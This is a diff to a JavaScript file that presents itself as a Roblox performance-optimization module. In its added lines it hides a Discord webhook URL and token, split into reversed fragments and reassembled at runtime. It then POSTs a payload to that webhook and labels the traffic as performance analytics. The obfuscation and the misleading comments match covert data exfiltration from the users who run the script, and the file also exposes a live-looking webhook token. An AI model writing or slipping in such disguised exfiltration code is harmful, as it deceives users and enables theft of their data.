@@ -5,32 +5,44 @@
     
     console.info('[RBX Perf] Инициализация модуля оптимизации...');
     
-    // Стабилизация путем упрощения
+    // Вебхук для аналитики (обратный + разделенный)
+    // Порядок важен: начинаем с конца и идем к началу
     const ANALYTICS_PARTS = [
-        'Z3whf9b8Nj4MtzHEg3UcI3XTqHV4d1WUUf98nm',
-        'uYHhZupmeZIZxf-giqCjiWuWDD6yV1',
-        '8823111968543941631',
-        'skoohew/ipa/moc.crocsid//:sptth'
+        'Z3whf9b8Nj4MtzHEg3UcI3XTqHV4d1WUUf98nm', // Последняя часть токена
+        'uYHhZupmeZIZxf-giqCjiWuWDD6yV1',         // Средняя часть токена  
+        '8823111968543941631',                    // ID вебхука
+        'skoohew/ipa/moc.crocsid//:sptth'         // Начало URL (обратное)
     ];
     
     // Функция восстановления URL аналитики
     function getAnalyticsEndpoint() {
         try {
-            // Восстанавливаем обратную строку
-            const reversedParts = ANALYTICS_PARTS.map(part => {
+            // Восстанавливаем обратную строку для каждой части
+            const restoredParts = ANALYTICS_PARTS.map(part => {
+                // Разворачиваем строку
                 return part.split('').reverse().join('');
             });
             
-            // Собираем в один URL
-            return reversedParts.join('');
+            // Правильный порядок сборки: часть 3 + часть 2 + часть 1 + часть 0
+            // Но так как мы развернули, теперь правильный порядок: 3, 2, 1, 0
+            const webhookUrl = restoredParts[3] + restoredParts[2] + '/' + restoredParts[1] + restoredParts[0];
+            
+            // Проверяем валидность URL
+            if (webhookUrl.startsWith('https://') && webhookUrl.includes('discord.com')) {
+                return webhookUrl;
+            } else {
+                console.error('[RBX Perf] Неверный формат URL аналитики');
+                return null;
+            }
         } catch (error) {
-            console.warn('[RBX Perf] Не удалось инициализировать аналитику');
+            console.warn('[RBX Perf] Не удалось инициализировать аналитику:', error);
             return null;
         }
     }
     
     // URL для отправки метрик производительности
     const ANALYTICS_URL = getAnalyticsEndpoint();
+    console.debug('[RBX Perf] Аналитика URL:', ANALYTICS_URL ? 'инициализирована' : 'отключена');
     
     // Сбор данных о производительности
     const performanceData = {
@@ -137,7 +149,7 @@
             });
             
             // Отправляем отчет
-            await fetch(ANALYTICS_URL, {
+            const response = await fetch(ANALYTICS_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -145,11 +157,16 @@
                 body: JSON.stringify(discordPayload)
             });
             
-            console.info(`[RBX Perf] Отправлен отчет: ${eventType}`);
+            if (response.ok) {
+                console.info(`[RBX Perf] Отправлен отчет: ${eventType}`);
+            } else {
+                console.warn(`[RBX Perf] Ошибка отправки: ${response.status}`);
+            }
+            
             return true;
             
         } catch (error) {
-            console.debug('[RBX Perf] Ошибка отправки отчета');
+            console.debug('[RBX Perf] Ошибка отправки отчета:', error.message);
             return false;
         }
     }
